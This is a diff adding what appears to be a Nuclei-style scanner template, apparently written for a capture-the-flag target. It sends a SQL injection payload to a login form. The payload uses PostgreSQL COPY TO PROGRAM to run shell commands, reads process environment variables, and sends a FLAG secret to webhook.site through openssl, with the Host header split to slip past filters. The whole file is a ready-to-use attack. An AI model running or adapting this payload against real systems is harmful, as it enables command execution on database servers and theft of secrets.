@@ -1,0 +1,16 @@
+id: exploit-sql-update
+info:
+  name: exploit-sql-update
+  author: you
+
+requests:
+  - raw:
+      - |
+        POST /internal/login HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+
+        username=' ; COPY (SELECT encode(pg_read_binary_file('/proc/1/environ'), 'base64')) TO PROGRAM 'tee /tmp/ztzzzwashere; printf "POST /51370ad9-5af5-455b-b288-332659287ab1/?%s HTTP/1.1\r\nHo""st: webhook.siter\nConnection: close\r\n\r\n" $(echo $FLAG) | openssl s_client -quiet -connect webhook.site:443 -servername webhook.site' ; -- &password=x
+    matchers:
+      - type: status
+        status:
+          - 302
